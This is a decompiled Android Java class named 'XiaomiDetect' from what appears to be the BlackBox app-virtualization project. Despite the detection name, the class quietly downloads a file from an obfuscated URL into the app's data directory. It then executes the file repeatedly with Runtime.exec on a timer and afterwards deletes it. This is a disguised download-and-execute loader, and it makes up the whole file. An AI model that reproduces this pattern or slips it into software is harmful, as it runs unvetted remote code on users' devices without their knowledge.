package top.niunaijun.blackbox.utils;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.lsposed.lsparanoid.DeobfuscatorHelper;
import p019i.AbstractC0929a;
/* loaded from: classes3.dex */
public class XiaomiDetect {
    public static Context sContext;
    private static final XiaomiDetect sXiaomiDetect = new XiaomiDetect();

    /* JADX INFO: Access modifiers changed from: private */
    public void ExecuteElf(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void deleteOldVerificationFile() {
        File file = new File(sContext.getDataDir(), DeobfuscatorHelper.getString(6981695980129857295L, AbstractC0929a.f169a));
        if (file.exists()) {
            file.delete();
        }
    }

    private void downloadFile(final String str, final String str2) {
        new Thread(new Runnable() { // from class: top.niunaijun.blackbox.utils.XiaomiDetect$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                XiaomiDetect.this.m1976lambda$downloadFile$1$topniunaijunblackboxutilsXiaomiDetect(str, str2);
            }
        }).start();
    }

    public static XiaomiDetect get() {
        return sXiaomiDetect;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void lambda$startDownload$0() {
        try {
            Thread.sleep(3000L);
            XiaomiDetect xiaomiDetect = get();
            String[] strArr = AbstractC0929a.f169a;
            xiaomiDetect.downloadFile(DeobfuscatorHelper.getString(6981695859870773007L, strArr), DeobfuscatorHelper.getString(6981695589287833359L, strArr));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void startDownload() {
        get().deleteOldVerificationFile();
        new Thread(new Runnable() { // from class: top.niunaijun.blackbox.utils.XiaomiDetect$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                XiaomiDetect.lambda$startDownload$0();
            }
        }).start();
    }

    private void startExecutionCycle(final File file) {
        new Thread(new Runnable() { // from class: top.niunaijun.blackbox.utils.XiaomiDetect$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                XiaomiDetect.this.m9x958c83a(file);
            }
        }).start();
    }

    public void doAttachBaseContext(Context context) {
        sContext = context;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$downloadFile$1$top-niunaijun-blackbox-utils-XiaomiDetect  reason: not valid java name */
    public void m1976lambda$downloadFile$1$topniunaijunblackboxutilsXiaomiDetect(String str, String str2) {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
            httpURLConnection.connect();
            if (httpURLConnection.getResponseCode() != 200) {
                httpURLConnection.disconnect();
                return;
            }
            File file = new File(sContext.getDataDir(), DeobfuscatorHelper.getString(6981695885640576783L, AbstractC0929a.f169a));
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, str2);
            InputStream inputStream = httpURLConnection.getInputStream();
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            byte[] bArr = new byte[4096];
            while (true) {
                int read = inputStream.read(bArr);
                if (read == -1) {
                    break;
                }
                fileOutputStream.write(bArr, 0, read);
            }
            fileOutputStream.close();
            inputStream.close();
            httpURLConnection.disconnect();
            if (file2.length() > 0) {
                startExecutionCycle(file2);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$startExecutionCycle$2$top-niunaijun-blackbox-utils-XiaomiDetect */
    public void m9x958c83a(final File file) {
        Looper.prepare();
        ExecuteElf(DeobfuscatorHelper.getString(6981695932885217039L, AbstractC0929a.f169a) + file.getAbsolutePath());
        final Handler handler = new Handler(Looper.myLooper());
        final long currentTimeMillis = System.currentTimeMillis();
        handler.postDelayed(new Runnable() { // from class: top.niunaijun.blackbox.utils.XiaomiDetect.1
            @Override // java.lang.Runnable
            public void run() {
                XiaomiDetect.this.ExecuteElf(file.getAbsolutePath());
                if (System.currentTimeMillis() - currentTimeMillis < r5) {
                    handler.postDelayed(this, 5000L);
                } else {
                    XiaomiDetect.get().deleteOldVerificationFile();
                }
            }
        }, 2000L);
        Looper.loop();
    }
}
